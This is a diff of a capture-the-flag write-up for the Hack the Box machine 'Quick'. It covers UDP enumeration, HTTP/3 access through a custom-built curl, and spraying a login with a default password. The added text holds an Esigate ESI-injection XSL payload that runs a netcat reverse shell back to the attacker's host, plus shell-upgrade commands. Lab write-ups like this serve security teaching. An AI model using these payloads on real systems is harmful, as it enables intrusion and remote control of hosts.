@@ -14,13 +14,22 @@ Short description to include any strange things to be dealt with
 
 ## Useful Skills and Tools
 
-#### Connecting to HTTPS through UDP \(QUIC protocol\)
+### Connecting to HTTPS through UDP \(QUIC protocol\)
 
 * quiche \[link\]
 * experimental curl features \[link\]
 * can also change settings in-browser experimental settings \[link\]
+* 
+### Upgrading a limited shell to a full TTY
 
-#### Creating an SSH tunnel for port forwarding
+1. Determine the installed version of python with `which python`.
+2. Spawn a Bash shell through python's PTY with `python -c 'import pty;pty.spawn("/bin/bash")'`.
+3. Hit CTRL+Z to background the shell.
+4. Type `stty raw -echo` to enable all input to be sent raw through your reverse shell.
+5. Type `fg` to return your shell to the foreground.
+6. Enable screen clearing and colors with `export TERM=xterm-256color`
+
+### Creating an SSH tunnel for port forwarding
 
 * -L flag
 * link
@@ -77,15 +86,19 @@ James (LazyCoop Pvt Ltd) - China
 
 My shortlist of potential usernames had four entries on it. 
 
+![](../../.gitbook/assets/2-login.png)
+
 Clicking on the "Get Started" link led to a login page at [http://10.10.10.186:9001/login.php](http://10.10.10.186:9001/login.php). I attempted to see if any of these names would give me a positive error indicating a valid username, but the form required email addresses rather than usernames so it yielded nothing.
 
-![](../../.gitbook/assets/2-login.png)
+![](../../.gitbook/assets/6-dirbuster-quick.png)
 
 According to my dirbuster scan there was an exposed `db.php`, though I was not sure how to interact with it.  Navigating to that site only brought up a blank page.
 
 ![](../../.gitbook/assets/3-portal.png)
 
-On the main page, there was a link to `portal.quick.htb`, which I added to my `hosts` file.  It seemed to be an exact copy of the first page.  I did notice something interesting while viewing the requests in Burp though: there was an HTTP header that said `X-Powered-By: Esigate`.  Some research revealed that this was a webapp integration backend for the site.  My research also found that there were some vulnerabilities that could be exploited in this software, though they required an exposed form where specifically crafted requests could bypass security controls.  Unfortunately I didn't have anywhere to test for this vulnerability yet. [http://www.esigate.org/security/security-01.html](http://www.esigate.org/security/security-01.html) [https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/](https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/)
+On the main page, there was a link to `portal.quick.htb`, which I added to my `hosts` file.  It seemed to be an exact copy of the first page, except for the link that led to `portal.quick.htb` was an HTTPS site that did not connect.  
+
+I did notice something interesting while viewing the requests in Burp though: there was an HTTP header that said `X-Powered-By: Esigate`.  Some research revealed that this was a webapp integration backend for the site.  My research also found that there were some vulnerabilities that could be exploited in this software, though they required an exposed form where specifically crafted requests could bypass security controls.  Unfortunately I didn't have anywhere to test for this vulnerability yet. [http://www.esigate.org/security/security-01.html](http://www.esigate.org/security/security-01.html) [https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/](https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/)
 
 ![](../../.gitbook/assets/5-server-status.png)
 
@@ -96,7 +109,7 @@ I also noted that the apache `server-status` page was accessible, which could le
 Unfortunately this next part was spoiled for me a bit by someone mentioning that TCP was the only protocol that Nmap scanned by default and further enumeration was required.  This was enough of a clue for my to try a UDP scan to see if there were any more ports open.  
 
 {% hint style="info" %}
-UDP scans take much, much longer to complete due to the way enumeration has to be done.  Potential open UDP ports are determined by not receiving a response back from a probe, as opposed to TCP where a TCP - ACK is generally indicative of an open port.  UDP does not use flags in the same way as TCP, and relies on ICMP port unreachable messages to relay closed ports. 
+UDP scans take much, much longer to complete due to the way enumeration has to be done.  Potential open UDP ports are determined by not receiving a response back from a probe, as opposed to TCP where a TCP - ACK is generally indicative of an open port, and a RST means the port is closed.  UDP does not use flags in the same way as TCP, and relies on ICMP port unreachable messages to relay closed ports. 
 
 I recommend not scanning all 65536 ports at a time if you ever need to scan UDP, and do it in chunks.  This scan also requires root privileges to run.
 {% endhint %}
@@ -134,21 +147,26 @@ Nmap done: 1 IP address (1 host up) scanned in 1348.02 seconds
            Raw packets sent: 1444 (43.230KB) | Rcvd: 1157 (70.616KB)
 ```
 
-researching UDP port 443 that nmap found open leads to [https://ec.haxx.se/http/http-http3](https://ec.haxx.se/http/http-http3). I remember reading about this new protocol, but didnt expect it to already by implemented in a challenge \(kudos to MrR3boot!\) This explains why the portal.quick.htb site has a link to an https:// version that didn't work since the browser expects TCP:443.
+There was one UDP port that seemed to be open.  Next I did some research on HTTPS over UDP port 443 and found some articles on the new protocol HTTP/3.  I remember reading about the new HTTPS protocol over UDP which used a protocol called QUIC, but I didn't expect it to already by implemented in a Hack the Box challenge \(kudos to MrR3boot!\). 
 
-The QUIC protocol, which HTTP/3 uses UDP for a fast connectionless "session". Since most websites are simple requests and responses, UDP works fine, and the extra overhead from TCP just slows everything down. Supposedly QUIC will be much faster \(pun intended!\)
+Resources:
 
-[https://geekflare.com/http3-test/](https://geekflare.com/http3-test/) [https://caniuse.com/\#feat=http3](https://caniuse.com/#feat=http3) google chrome \(or chromium\) can enable quic
+*  [https://daniel.haxx.se/http3-explained/](https://daniel.haxx.se/http3-explained/)
+*  [https://ec.haxx.se/http/http-http3](https://ec.haxx.se/http/http-http3). 
+*  [https://github.com/curl/curl/wiki/QUIC-implementation](https://github.com/curl/curl/wiki/QUIC-implementation)
+*  [https://quicwg.org/](https://quicwg.org/)
 
-[https://docs.google.com/document/d/1lmL9EF6qKrk7gbazY8bIdvq3Pno2Xj\_l\_YShP40GLQE/edit\#](https://docs.google.com/document/d/1lmL9EF6qKrk7gbazY8bIdvq3Pno2Xj_l_YShP40GLQE/edit#) chrome://flags/
+The QUIC protocol is used in HTTP/3 and utilizes UDP for a fast connectionless "session".  Since most websites are simple requests and responses, UDP works fine, because the extra overhead from TCP just slows everything down. Supposedly QUIC will be much faster \(pun intended?\).
+
+This explains why the `portal.quick.htb` site had a link to an https:// site that didn't work, since the browser expects TCP:443, and most browsers do not currently support the new protocol which uses UDP. I did some looking around to see if any browsers did have support, and found [https://caniuse.com/\#feat=http3](https://caniuse.com/#feat=http3).  It seems that some browers such as Google Chrome \(or Chromium\) can enable quic in the experimental settings page at `chrome://flags`. [https://docs.google.com/document/d/1lmL9EF6qKrk7gbazY8bIdvq3Pno2Xj\_l\_YShP40GLQE/edit\#](https://docs.google.com/document/d/1lmL9EF6qKrk7gbazY8bIdvq3Pno2Xj_l_YShP40GLQE/edit#) 
 
 ![](../../.gitbook/assets/7-quic.png)
 
-about http/3 [https://daniel.haxx.se/http3-explained/](https://daniel.haxx.se/http3-explained/) [https://github.com/curl/curl/wiki/QUIC-implementation](https://github.com/curl/curl/wiki/QUIC-implementation) [https://quicwg.org/](https://quicwg.org/)
+It seems that some browsers such as Google Chrome \(or Chromium\) can enable QUIC in the experimental settings page at `chrome://flags`. [https://docs.google.com/document/d/1lmL9EF6qKrk7gbazY8bIdvq3Pno2Xj\_l\_YShP40GLQE/edit\#](https://docs.google.com/document/d/1lmL9EF6qKrk7gbazY8bIdvq3Pno2Xj_l_YShP40GLQE/edit#) 
 
-## building an HTTP/3 version of curl
+## Building an HTTP/3 version of cURL
 
-[https://github.com/curl/curl/blob/master/docs/HTTP3.md\#quiche-version](https://github.com/curl/curl/blob/master/docs/HTTP3.md#quiche-version)
+While reading up on HTTP/3 and determining if a site supports it or not I found the site [https://geekflare.com/http3-test/](https://geekflare.com/http3-test/).  It mentioned a version of cURL that can be built from source that supports this protocol, so I downloaded the code from the GitHub repository at [https://github.com/curl/curl/blob/master/docs/HTTP3.md\#quiche-version](https://github.com/curl/curl/blob/master/docs/HTTP3.md#quiche-version) and followed the instructions.
 
 ```text
 quiche version
@@ -179,7 +197,11 @@ curl --alt-svc altsvc.cache https://quic.aiortc.org/
 
 [https://unix.stackexchange.com/questions/360434/how-to-install-libtoolize](https://unix.stackexchange.com/questions/360434/how-to-install-libtoolize)
 
-After installing rust language \(and many other dependencies\) I had a shiny new experimental version of curl to play with with http/3 support. With this I was able to download the page at [https://portal.quick.htb](https://portal.quick.htb) since I didn't want to live in the install directory I created an alias of `curl3` to the new curl with `alias curl3=</install_path/>curl`
+After installing the Rust language \(and many other dependencies\) I had a shiny new experimental version of curl to play with that had HTTP/3 support. 
+
+{% hint style="info" %}
+_Since I didn't want to just live in the install directory I created an alias of **`curl3`** to the new curl with **`alias curl3=</install_path/>curl`**_
+{% endhint %}
 
 ```markup
 zweilos@kali:~/htb/quick$ curl3 --http3 https://portal.quick.htb/
@@ -188,26 +210,7 @@ zweilos@kali:~/htb/quick$ curl3 --http3 https://portal.quick.htb/
 <h1>Quick | Portal</h1>
 <head>
 <style>
-ul {
-  list-style-type: none;
-  margin: 0;
-  padding: 0;
-  width: 200px;
-  background-color: #f1f1f1;
-}
-
-li a {
-  display: block;
-  color: #000;
-  padding: 8px 16px;
-  text-decoration: none;
-}
-
-/* Change the link color on hover */
-li a:hover {
-  background-color: #555;
-  color: white;
-}
+...snipped CSS...
 </style>
 </head>
 <body>
@@ -221,7 +224,7 @@ li a:hover {
 </html>
 ```
 
-There were four pages listed: `index.php`, `contact`, `about`, and `docs`
+With this new tool I was able to download the page at [https://portal.quick.htb](https://portal.quick.htb). There were four pages listed: `index.php`, `contact`, `about`, and `docs`.  
 
 ```markup
 zweilos@kali:~/htb/quick$ curl3 --http3 https://portal.quick.htb/index.php?view=contact
@@ -230,38 +233,7 @@ zweilos@kali:~/htb/quick$ curl3 --http3 https://portal.quick.htb/index.php?view=
 <head>
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <style>
-body {font-family: Arial, Helvetica, sans-serif;}
-* {box-sizing: border-box;}
-
-input[type=text], select, textarea {
-  width: 100%;
-  padding: 12px;
-  border: 1px solid #ccc;
-  border-radius: 4px;
-  box-sizing: border-box;
-  margin-top: 6px;
-  margin-bottom: 16px;
-  resize: vertical;
-}
-
-input[type=submit] {
-  background-color: #4CAF50;
-  color: white;
-  padding: 12px 20px;
-  border: none;
-  border-radius: 4px;
-  cursor: pointer;
-}
-
-input[type=submit]:hover {
-  background-color: #45a049;
-}
-
-.container {
-  border-radius: 5px;
-  background-color: #f2f2f2;
-  padding: 20px;
-}
+...snipped CSS...
 </style>
 </head>
 <body>
@@ -293,7 +265,7 @@ input[type=submit]:hover {
 </html>
 ```
 
-The contact page looked just like the contact page on the other sites.
+The `/contact` page looked like a work in progress and had no useful information.
 
 ```markup
 zweilos@kali:~/htb/quick$ curl3 --http3 https://portal.quick.htb/index.php?view=about
@@ -302,74 +274,7 @@ zweilos@kali:~/htb/quick$ curl3 --http3 https://portal.quick.htb/index.php?view=
 <head>
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <style>
-body {
-  font-family: Arial, Helvetica, sans-serif;
-  margin: 0;
-}
-
-html {
-  box-sizing: border-box;
-}
-
-*, *:before, *:after {
-  box-sizing: inherit;
-}
-
-.column {
-  float: left;
-  width: 33.3%;
-  margin-bottom: 16px;
-  padding: 0 8px;
-}
-
-.card {
-  box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2);
-  margin: 8px;
-}
-
-.about-section {
-  padding: 50px;
-  text-align: center;
-  background-color: #474e5d;
-  color: white;
-}
-
-.container {
-  padding: 0 16px;
-}
-
-.container::after, .row::after {
-  content: "";
-  clear: both;
-  display: table;
-}
-
-.title {
-  color: grey;
-}
-
-.button {
-  border: none;
-  outline: 0;
-  display: inline-block;
-  padding: 8px;
-  color: white;
-  background-color: #000;
-  text-align: center;
-  cursor: pointer;
-  width: 100%;
-}
-
-.button:hover {
-  background-color: #555;
-}
-
-@media screen and (max-width: 650px) {
-  .column {
-    width: 100%;
-    display: block;
-  }
-}
+...snipped CSS...
 </style>
 </head>
 <body>
@@ -421,7 +326,7 @@ html {
 </html>
 ```
 
-The about page contained 3 potential users and usernames: Jane Doe `jane@quick.htb`, Mike Ross `mike@quick.htb`, and John Doe `john@quick.htb`
+The `/about` page contained three potential users and useful email addresses: Jane Doe `jane@quick.htb`, Mike Ross `mike@quick.htb`, and John Doe `john@quick.htb`.  
 
 ```markup
 zweilos@kali:~/htb/quick$ curl3 --http3 https://portal.quick.htb/index.php?view=docs
@@ -439,7 +344,7 @@ zweilos@kali:~/htb/quick$ curl3 --http3 https://portal.quick.htb/index.php?view=
 </html>
 ```
 
-the docs page contained references to two PDF files. Hopefully I can download them and find more juicy information!
+The `/docs` page contained references to two PDF files. I downloaded them to see if I could find more juicy information.
 
 ```text
 zweilos@kali:~/htb/quick$ curl3 --http3 https://portal.quick.htb/docs/QuickStart.pdf --output quickstart.pdf
@@ -452,15 +357,15 @@ zweilos@kalimaa:~/htb/quick$ curl3 --http3 https://portal.quick.htb/docs/Connect
 100 83830  100 83830    0     0   258k      0 --:--:-- --:--:-- --:--:--  257k
 ```
 
-Both PDFs downloaded with no issues. The Connectivity.pdf contained some interesting information!
-
-![](https://github.com/zweilosec/htb-writeups/tree/de76ed6e78e992dd3769f7fa850ef9167e04b2c0/linux-machines/hard/password.png) Quick4cc3$$
+Both PDFs downloaded with no issues using the new cURL tool. The document `Connectivity.pdf` contained some interesting information!
 
 ![](../../.gitbook/assets/8-password-pdf.png)
 
-The Connectivity.pdf had a link that lead back to the first site: `http://quick.htb`, while the other doc linked back to the https version. Maybe this is a clue to log into the first site?
+Apparently this broadband provider gives their customers a default password to use to log into their accounts.  I hoped that one of the clients was lazy enough to use the same password to log into the portal, and then not change it later.  
 
-It took a little bit of guesswork to figure out the next part since I couldn't see any clues that pointed to any email addresses other than the three `@quick.htb` ones. I first tried iterating through all of the names I had found while adding `@quick.htb` on the the end but that didn't get me any successes. Next I decided that since they provided the company names and countries for each of the users, that I could make potential email addresses out of those.
+The file `Connectivity.pdf` also had a link that led back to the first site: `http://quick.htb`, while the other document linked back to the HTTPS version. I thought that maybe this was a clue to log into the first site.
+
+It took a little bit of guesswork to figure out how to log into the site since I couldn't see any clues that pointed to any email addresses other than the three `@quick.htb` ones. I first tried iterating through all of the names I had found while adding `@quick.htb` on the the end, but that wasn't successful. Next I decided that since they provided the company names and countries for each of the users, I could make potential email addresses out of those.
 
 ```text
 zweilos@kali:~/htb/quick$ wfuzz -w users -c -X POST -u 'http://quick.htb:9001/login.php' -d 'email=FUZZ&password=Quick4cc3$$'
@@ -489,7 +394,7 @@ Filtered Requests: 0
 Requests/sec.: 66.57097
 ```
 
-My hunch seemed to be right! That 302 HTTP response should mean a successful login for `elisa@wink.co.uk`! I'm surprised there was only one user that used the default password provided to log in! :P
+I loaded my potential email address list into wfuzz and used it to username-spray the website.  My hunch seemed to be right! That 302 HTTP response above meant I had found a successful login for `elisa@wink.co.uk`! _I'm actually surprised there was only one user that used the default password provided to log in! :P_
 
 ```http
 POST /login.php HTTP/1.1
@@ -509,17 +414,21 @@ DNT: 1
 email=elisa%40wink.co.uk&password=Quick4cc3%24%24
 ```
 
+I made sure to capture the login credentials in Burp so I could easily resend them any time I needed.
+
 ## Initial Foothold
 
 ![](../../.gitbook/assets/10-logged-in.png)
 
-Now that I was logged into the portal, I had access to /home, /ticket, and /search seen in my dirbuster output earlier. 
+Now that I was logged into the portal, I had access to the `/home`, `/ticket`, and `/search` pages I had seen in my dirbuster output earlier. 
 
 ![](../../.gitbook/assets/12-raise-ticket.png)
 
+The ticketing page had an entry field that gave me a ticket number when I submitted it.
+
 ![](../../.gitbook/assets/11-ticket.png)
 
-Also, now that I am logged in I can try to see if the Esigate vulnerability I had read about earlier can be exploited [https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/](https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/) [https://github.com/esigate/esigate/issues/209](https://github.com/esigate/esigate/issues/209) CVE-2018-1000854
+Since I now had access to some fields that I could send input through, I decided to test out that Esigate vulnerability I had read about earlier to see if it could be exploited. It was assigned as CVE-2018-1000854. [https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/](https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/) [https://github.com/esigate/esigate/issues/209](https://github.com/esigate/esigate/issues/209) 
 
 ```text
 zweilos@kali:~/htb/quick$ python -m SimpleHTTPServer 9088
@@ -527,9 +436,35 @@ Serving HTTP on 0.0.0.0 port 9088 ...
 10.10.10.186 - - [11/Aug/2020 21:15:36] "GET /evil.xsl HTTP/1.1" 200 -
 ```
 
-`<esi:include src="http://10.10.15.57:9088/evil.xml" stylesheet="http://10.10.15.57:9088/evil.xsl"> </esi:include>` need xml file to reflect code into
+I followed the instructions in the blog and crafted an XSL file, which contained specially formed XML code that would be read and executed by Esigate when reflected into an XML file.
 
-The vulnerability exists in the ticket search function!
+![](../../.gitbook/assets/18-im-in.png)
+
+I submitted the above code into the ticketing system, which caused Esigate to load the `evil.xml` file with my code from the `evil.xsl` code reflected into it as a "stylesheet". 
+
+```markup
+<?xml version="1.0" ?>
+<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
+<xsl:output method="xml" omit-xml-declaration="yes"/>
+<xsl:template match="/"
+xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
+xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime">
+<root>
+	<xsl:variable name="cmd"><![CDATA[./nc -e /bin/sh 10.10.15.57 13371]]></xsl:variable>
+	<xsl:variable name="rtObj" select="rt:getRuntime()"/>
+	<xsl:variable name="process" select="rt:exec($rtObj, $cmd)"/>
+	Process: <xsl:value-of select="$process"/>
+	Command: <xsl:value-of select="$cmd"/>
+</root>
+</xsl:template>
+</xsl:stylesheet>
+```
+
+![](../../.gitbook/assets/18.5-im-in.png)
+
+![](../../.gitbook/assets/19-ticket.png)
+
+After some testing I found that the vulnerability indeed existed in the ticket search function!  After submitting my "ticket" to the system searching for the ticket number caused the code in the malicious XML file to be read and executed by Esigate.
 
 ```text
 zweilos@kali:~/htb/quick$ python -m SimpleHTTPServer 9088
@@ -552,13 +487,7 @@ Serving HTTP on 0.0.0.0 port 9088 ...
 10.10.10.186 - - [11/Aug/2020 22:06:44] "GET /test1.xml HTTP/1.1" 200 -
 ```
 
-After quite a bit of head-scratching and testing, I have decided that you can only use a filename once. After that it gives a 404 error for a file that definitely exists. This must be something the server is doing...
-
-![](../../.gitbook/assets/18-im-in.png)
-
-![](../../.gitbook/assets/18.5-im-in.png)
-
-![](../../.gitbook/assets/19-ticket.png)
+After quite a bit of head-scratching and testing, I found that I could only use a specific filename once. After that it caused a 404 error for even files that definitely exist on my locally hosted python server. I wasn't sure what was going on but it must have been something the server was doing.
 
 ```text
 zweilos@kali:~/htb/quick$ nc -lvnp 13371 > passwd
@@ -566,9 +495,9 @@ listening on [any] 13371 ...
 connect to [10.10.15.57] from (UNKNOWN) [10.10.10.186] 43030
 ```
 
-Unfortunately the file was blank. After testing it again a different way, it seems as if this command is not actually running so nothing being sent.
+During some of my testing, I tried to get the server to send me `/etc/passwd`, but unfortunately the file was blank. After testing it again a different way, I concluded that this command was being blocked so nothing was being sent.  The important thing was that I could see that my test exploit worked.
 
-created a python script to automate the file upload and activation process
+Next I created a python script to automate the file upload and ticket search activation process.
 
 ```python
 #!/usr/bin/env python3
@@ -675,7 +604,7 @@ else:
 #TODO: instead of nc listener in terminal, implement in-script
 ```
 
-I ran the script and crossed my fingers that everything would work
+I ran the script with three separate ESL files.  Each were loaded with commands that would enable me to get a reverse shell.  The first send a version of `nc` that had the ability to execute commands upon connection.  The second ran `chmod +x nc` to ensure it was executable. The third contained my reverse shell command that would connect back to my machine.  I loaded up all of my files with different filenames, executed my script, and crossed my fingers hoping that everything would work.
 
 ```text
 zweilos@kali:~/htb/quick$ python3 auto-evil.py 
@@ -693,7 +622,7 @@ Evil3 upload successful!
 Check your nc listener...shell should be inbound!
 ```
 
-All of my files were uploaded successfully...
+Everything looked like it completed without errors...
 
 ```text
 zweilos@kali:~/htb/quick$ python -m SimpleHTTPServer 9088
@@ -707,6 +636,8 @@ Serving HTTP on 0.0.0.0 port 9088 ...
 10.10.10.186 - - [15/Aug/2020 12:24:47] "GET /evil2.xml HTTP/1.1" 200 -
 ```
 
+All of my files were uploaded successfully...
+
 ```text
 zweilos@kalimaa:~/htb/quick$ nc -lvnp 13371
 listening on [any] 13371 ...
@@ -719,13 +650,13 @@ which python
 python -c 'import pty;pty.spawn("/bin/bash")'
 sam@quick:~$ ^Z
 [1]+  Stopped                 nc -lvnp 13371
-zweilos@kalimaa:~/htb/quick$ stty raw -echo
-zweilos@kalimaa:~/htb/quick$ nc -lvnp 13371
+zweilos@kali:~/htb/quick$ stty raw -echo
+zweilos@kali:~/htb/quick$ nc -lvnp 13371
 
 sam@quick:~$ export TERM=xterm-256color
 ```
 
-I got a limited shell that I quickly upgraded to a fully interactive Bash shell using python.
+And... I received a limited shell at my waiting listener that I quickly upgraded to a fully interactive Bash shell using python.
 
 ## Road to User
 
